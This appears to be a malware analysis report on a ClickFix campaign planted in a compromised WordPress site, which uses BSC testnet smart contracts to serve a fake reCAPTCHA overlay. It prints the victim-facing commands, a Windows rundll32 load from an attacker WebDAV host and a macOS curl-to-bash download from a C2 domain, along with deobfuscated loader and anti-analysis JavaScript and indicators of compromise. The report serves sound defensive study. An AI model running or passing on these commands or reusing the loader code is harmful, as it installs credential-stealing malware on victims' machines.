# ClickFix Malware Analysis — BSC Testnet EtherHiding Variant

| Field | Value |
|---|---|
| **Date Discovered** | 2026-05-08 |
| **Compromised Site** | WordPress site (Divi theme, WooCommerce) |
| **CMS** | WordPress (Divi theme, WooCommerce) |
| **Attack Type** | ClickFix (fake reCAPTCHA social engineering) |
| **Delivery** | Blockchain-based (BSC testnet smart contracts) |
| **Target OS** | Windows and macOS |
| **Status at analysis time** | Active — C2 domains resolving, contracts returning payloads |

---

## Executive Summary

A ClickFix injection was discovered on a compromised WordPress site. The
attack uses a multi-stage, blockchain-delivered payload chain that
presents a fake Google reCAPTCHA overlay, then instructs victims to
execute a malicious command via Windows Run dialog or macOS Terminal. The
Windows variant loads a remote DLL via WebDAV; the macOS variant
downloads and executes a shell script from a C2 domain.

The use of Binance Smart Chain testnet for payload storage is notable —
it provides the attacker with a free, censorship-resistant, and easily
updatable payload hosting mechanism.

---

## Attack Chain

```
[1] Compromised WordPress Site
 |  Injected <script src="data:text/javascript;base64,...">
 |  in page <head> — obfuscated JS with hex variable names
 |
[2] BSC Testnet — Dispatcher Contract
 |  0xA1decFB75C8C0CA28C10517ce56B710baf727d2e
 |  eth_call via https://bsc-testnet-rpc.publicnode.com/
 |  Method: 0x6d4ce63c (get())
 |  Returns: Stage 2 loader (base64 in ABI-encoded response)
 |
[3] Anti-Analysis + OS Detection
 |  - Detects headless browsers (Puppeteer, Playwright, PhantomJS)
 |  - Detects localhost/private IPs → aborts: "stop watching us :)"
 |  - Fingerprints victim IP via ip-info.ff.avast.com
 |  - OS routing:
 |      Windows → contract 0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff
 |      macOS   → contract 0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5
 |      Linux   → no payload (not targeted)
 |
[4] ClickFix UI Overlay
 |  Fake reCAPTCHA: "I'm not a robot" checkbox
 |  On click → "Verification Steps" panel:
 |    Windows: "Press Win+R, then Ctrl+V, then Enter"
 |    macOS:   "Open Terminal (Applications > Utilities), then Cmd+V, then Enter"
 |  Clipboard is written with the OS-specific command
 |
[5a] Windows Payload (clipboard)
 |  cmd /c "" start rundll32.exe \\vps.webcfgbase.pics\<GUID>\google.ocx,#1
 |  → Loads DLL from remote WebDAV share via rundll32
 |
[5b] macOS Payload (clipboard)
 |  /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL 'https://overreactuntr2ve.digital/?ublib=<UUID>')"
 |  → Downloads and executes shell script from C2
 |
[6] Tracking
     Yandex Metrika counter 99162160 tracks clicks
     On-chain isGoalReached() (contract 0xf4a3...) tracks infections per victim UUID
```

---

## Indicators of Compromise

### Smart Contracts (BSC Testnet, chain ID 97)

| Role | Address |
|---|---|
| Dispatcher (Stage 2 loader) | `0xA1decFB75C8C0CA28C10517ce56B710baf727d2e` |
| Windows payload | `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` |
| macOS payload | `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` |
| Infection tracking | `0xf4a32588b50a59a82fbA148d436081A48d80832A` |

### Domains

| Domain | Role | IP (at analysis time) |
|---|---|---|
| `vps.webcfgbase.pics` | Windows WebDAV C2 (DLL hosting) | 104.21.41.160, 172.67.148.56 (Cloudflare) |
| `overreactuntr2ve.digital` | macOS C2 (shell script) | 104.21.47.113, 172.67.147.56 (Cloudflare) |
| `mc.yandex.ru` | Yandex Metrika (click tracking) | Legitimate service, abused |
| `ip-info.ff.avast.com` | Victim IP fingerprinting | Legitimate service, abused |

### Files

| Filename | Path | Role |
|---|---|---|
| `google.ocx` | `\\vps.webcfgbase.pics\c2cb43a1-3db9-486a-a707-ee88bcdb4813\` | Windows DLL payload (loaded via rundll32) |

### Yandex Metrika

- Counter ID: `99162160`
- Events tracked: `reachGoal('Click', { clientID: usr_id })`

### Network Signatures

- JSON-RPC POST to `bsc-testnet-rpc.publicnode.com` with `eth_call` method
- WebDAV access to `\\vps.webcfgbase.pics\` (SMB/WebDAV over port 445/80)
- curl to `overreactuntr2ve.digital` with UA `Mac OS X 10_15_7`

---

## Cloaking Behavior

The injection uses multiple layers of evasion:

1. **Bot detection**: The base64 data URI script is present in page source for
   all visitors, but the decoded Stage 2 payload checks for headless browsers
   before rendering the overlay. Standard web crawlers (Googlebot, etc.) and
   security scanners receive a clean page experience.

2. **User-Agent cloaking**: Requests with default or bot-like headers returned
   a clean page. A realistic Chrome/Windows UA retrieved the injection. The
   cloaking appears to key on the `Accept` header and/or `User-Agent` string.

3. **Anti-analysis in Stage 2**: The dispatcher contract's decoded payload
   explicitly checks for:
   - `navigator.webdriver === true`
   - HeadlessChrome, PhantomJS, Puppeteer, Playwright in UA
   - `window.outerWidth === 0 && window.outerHeight === 0`
   - localhost, 127.0.0.1, 192.168.x.x, 10.x.x.x, 172.16-31.x.x
   - Missing `window.chrome`, `window.safari`, or `navigator.plugins`

4. **Cookie-based deduplication**: Sets `cjs_id` cookie (2-day expiry) to avoid
   re-serving the overlay to the same victim.

---

## Technical Details

### Stage 1: WordPress Injection

The injected code appears as a `<script>` tag with a `data:text/javascript;base64,...`
src attribute in the page `<head>`, between the Divi theme's Site Designer UI
script and the viewport meta tag. The base64 decodes to ~2KB of obfuscated
JavaScript using hex variable name patterns (`_0x27f51d`, `_0x196e`, etc.) with
a string array rotation anti-analysis technique.

The deobfuscated logic:
1. Constructs an `eth_call` JSON-RPC request to BSC testnet
2. POSTs to `bsc-testnet-rpc.publicnode.com`
3. Parses ABI-encoded string return value from contract
4. Base64-decodes and dynamically executes the returned string

### Stage 2: Dispatcher

The dispatcher payload (from contract `0xA1dec...`) is a ~1.5KB JavaScript
function that:
1. Runs anti-headless and anti-localhost checks
2. Detects OS via `navigator.userAgent` and `navigator.userAgentData.platform`
3. Calls `load_()` with the appropriate OS-specific contract address
4. The `load_()` function repeats the BSC RPC fetch pattern to retrieve
   the OS-specific Stage 3

### Stage 3: ClickFix Overlay + Payload

Both OS variants (~40KB each) share identical structure:

1. **Victim fingerprinting**: Synchronous XHR to `ip-info.ff.avast.com/v2/info`
   to get victim's IP address; falls back to random UUID
2. **Cookie tracking**: `cjs_id` cookie stores victim identifier
3. **HTML injection**: Injects the fake reCAPTCHA overlay via innerHTML with
   base64-decoded HTML including CSS, SVG reCAPTCHA logo, fake Privacy/Terms links
4. **Click handler**: On checkbox click, copies OS-specific command to clipboard
   via `navigator.clipboard.writeText()` and displays the "Verification Steps" panel
5. **Yandex Metrika**: Loads `mc.yandex.ru/metrika/tag.js`, initializes counter
   `99162160`, fires `reachGoal('Click')` on checkbox interaction
6. **Infection tracking**: Polls on-chain `isGoalReached(usr_id)` via contract
   `0xf4a3...` every ~1000ms to detect successful command execution; removes
   overlay on confirmation

### Windows Payload Detail

The clipboard command:
```
cmd /c "" start rundll32.exe \\vps.webcfgbase.pics\c2cb43a1-3db9-486a-a707-ee88bcdb4813\google.ocx,#1
```

- `cmd /c ""` — suppresses the cmd window title
- `start rundll32.exe` — launches in background
- `\\vps.webcfgbase.pics\...` — UNC path triggers WebDAV (or SMB) connection
  to attacker-controlled server
- `google.ocx,#1` — loads the DLL and calls its first exported function
- The DLL filename `google.ocx` is social engineering (appears legitimate)
- The GUID path component (`c2cb43a1-3db9-486a-a707-ee88bcdb4813`) likely
  serves as a campaign identifier

The command also prepends an `echo` with a fake "BotGuard" verification message:
```
echo ""BotGuard: Answer the protector challenge. Ref: <ID>
```
This provides false reassurance in the terminal output if the victim sees it.

### macOS Payload Detail

The clipboard command:
```bash
/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL 'https://overreactuntr2ve.digital/?ublib=<UUID>')"
```

- Downloads a shell script from the C2 with a spoofed macOS User-Agent
- `?ublib=<UUID>` — unique victim tracking parameter
- `-fsSL` — fail silently, show errors, follow redirects
- The downloaded script is piped directly to bash (no disk artifact)

The macOS overlay instructs users to open Terminal via
`Applications > Utilities > Terminal` rather than the Windows Win+R approach.

---

## Victim Impact Assessment

**If a Windows victim executes the command:**
- rundll32 loads a remote DLL, likely an infostealer (Lumma Stealer, Vidar,
  or similar based on current ClickFix campaign trends)
- Expected capabilities: browser credential theft, cryptocurrency wallet
  exfiltration, session cookie harvesting, keylogging
- The WebDAV delivery avoids writing an initial executable to disk

**If a macOS victim executes the command:**
- A shell script is downloaded and executed with user privileges
- Likely installs a macOS stealer (AMOS/Atomic Stealer or similar)
- May request administrator password via fake dialog
- Expected capabilities: Keychain access, browser data, crypto wallets

---

## Prior Art & Attribution

### EtherHiding (Guardio Labs, October 2023)

The technique of using BSC smart contracts to deliver malicious JavaScript
was first documented by **Guardio Labs** researchers Nati Tal and Oleg Zaytsev
in October 2023 under the name **"EtherHiding"**. BleepingComputer published
coverage the same day. The original campaign was **ClearFake** — fake browser
update overlays ("Update Chrome") on compromised WordPress sites that had
previously used Cloudflare Workers for payload hosting before pivoting to
blockchain delivery.

References:
- Guardio Labs: https://guard.io/labs/etherhiding-hiding-web2-malicious-code-in-web3-smart-contracts-65ea78efad16
- BleepingComputer: https://www.bleepingcomputer.com/news/security/hackers-use-binance-smart-chain-contracts-to-store-malicious-scripts/

### Evolution from ClearFake/EtherHiding to this sample

This sample represents a significant evolution of the EtherHiding technique,
now combined with the ClickFix social engineering pattern (documented
separately by Proofpoint and Sekoia in 2024-2025). Key differences:

| Aspect | EtherHiding/ClearFake (Oct 2023) | This sample (May 2026) |
|---|---|---|
| Blockchain | BSC **mainnet** | BSC **testnet** (zero cost) |
| Contract interaction | `ethers.js` library + `contract.get()` | Raw `fetch()` to public JSON-RPC (no library dependency) |
| Payload execution | `eval(atob(link))` | Same pattern |
| Social engineering | Fake browser update ("Update Chrome") | ClickFix fake reCAPTCHA ("I'm not a robot") |
| OS targeting | Windows only | Windows **and** macOS (separate contracts) |
| Anti-analysis | Minimal | Headless browser detection, localhost/private IP detection, cookie dedup |
| Tracking | None reported | Yandex Metrika + on-chain `isGoalReached()` per victim UUID |
| Victim fingerprinting | None reported | IP via `ip-info.ff.avast.com`, UUID cookies |

### Notable advancements

1. **Testnet migration**: Moving from BSC mainnet to testnet eliminates all
   transaction costs while maintaining the same availability and censorship
   resistance. Testnet contracts are equally persistent and publicly queryable.

2. **Library-free RPC**: Dropping the `ethers.js` dependency in favor of raw
   `fetch()` to a public RPC endpoint reduces the injection footprint and
   eliminates a fingerprintable CDN include (`cdn.ethers.io`).

3. **ClickFix convergence**: The shift from fake browser updates to fake
   reCAPTCHA verification represents the broader industry trend where ClickFix
   has displaced ClearFake as the dominant WordPress-based social engineering
   technique. The clipboard-based command execution is more reliable than
   tricking users into downloading and running an executable.

4. **Dual OS targeting**: Separate smart contracts for Windows and macOS
   payloads, with OS detection in the dispatcher, doubles the victim pool.
   The macOS variant uses `curl | bash` rather than the Windows WebDAV/rundll32
   approach.

5. **On-chain infection tracking**: The `isGoalReached()` contract function
   allows the attacker to track successful infections per victim UUID directly
   on the blockchain, enabling the overlay to self-remove after confirmation.
   This is a feedback loop not seen in the original EtherHiding research.

### Attribution

No specific threat actor attribution is made. The campaign shares
infrastructure patterns with ClearFake/EtherHiding lineage but the
combination with ClickFix, dual-OS targeting, and the sophistication
of the anti-analysis and tracking suggest either evolution of the
original actor or adoption of the technique by a separate group.

---

## Collection Methodology

- Page source retrieved via `curl` with Chrome/Windows UA
- Base64 injection extracted and decoded locally
- Smart contract payloads retrieved via direct JSON-RPC calls to BSC testnet
  public RPC endpoint (`bsc-testnet-rpc.publicnode.com`)
- All analysis performed statically — no payloads were executed
- C2 domain DNS resolution confirmed via `dig`

---

## Appendix A: Decoded Stage 1 (Dispatcher Loader)

```javascript
// Deobfuscated logic — original uses hex variable names and string array rotation
async function load_(address) {
  // ABI decode helper converts Uint8Array to hex string
  const request = {
    method: "eth_call",
    params: [{ to: address, data: "0x6d4ce63c" }, "latest"],
    id: 97,
    jsonrpc: "2.0"
  };
  const response = await fetch("https://bsc-testnet-rpc.publicnode.com/", {
    method: "POST",
    headers: { Accept: "application/json", "Content-Type": "application/json" },
    body: JSON.stringify(request)
  });
  const hex = (await response.json()).result.slice(2);
  const raw = new Uint8Array(hex.match(/[\da-f]{2}/gi).map(h => parseInt(h, 16)));
  const offset = Number(uint8ToHex(raw.slice(0, 32)));
  const len = Number(uint8ToHex(raw.slice(32, 32 + offset)));
  const value = String.fromCharCode.apply(null, raw.slice(32 + offset, 32 + offset + len));
  return value;  // base64-encoded next stage
}

// Entry point — fetches dispatcher, decodes, and executes
load_("0xA1decFB75C8C0CA28C10517ce56B710baf727d2e")
  .then(payload => /* base64-decode and execute */)
  .catch(() => {});
```

## Appendix B: Decoded Stage 2 (OS Router)

```javascript
const isHeadless = () => {
  const checks = [
    navigator.webdriver === true,
    /HeadlessChrome/.test(navigator.userAgent),
    navigator.userAgent.includes("PhantomJS"),
    navigator.userAgent.includes("Puppeteer"),
    navigator.userAgent.includes("Playwright"),
    window.outerWidth === 0 && window.outerHeight === 0,
    !window.chrome && !window.safari && !navigator.userAgent.includes("Firefox"),
  ].filter(Boolean).length;
  const isNormal = window.chrome?.runtime || window.safari
    || navigator.plugins.length > 0 || navigator.languages.length > 0;
  return checks >= 2 && !isNormal;
};

const isLocalhost = () => {
  const h = window.location.hostname;
  return h === "localhost" || h === "127.0.0.1" || h === "::1"
    || h.endsWith(".localhost") || h.startsWith("192.168.")
    || h.startsWith("10.") || /^172\.(1[6-9]|2\d|3[01])\./.test(h);
};

const isWindows = navigator.userAgent.includes("Windows")
  || navigator.platform.startsWith("Win")
  || navigator.userAgentData?.platform === "Windows";

const isMac = navigator.userAgent.includes("Macintosh")
  || navigator.platform.startsWith("Mac")
  || navigator.userAgentData?.platform === "macOS";

if (isHeadless() || isLocalhost()) {
  console.log("stop watching us :)");
} else if (isWindows) {
  load_("0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff");
} else if (isMac) {
  load_("0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5");
}
```
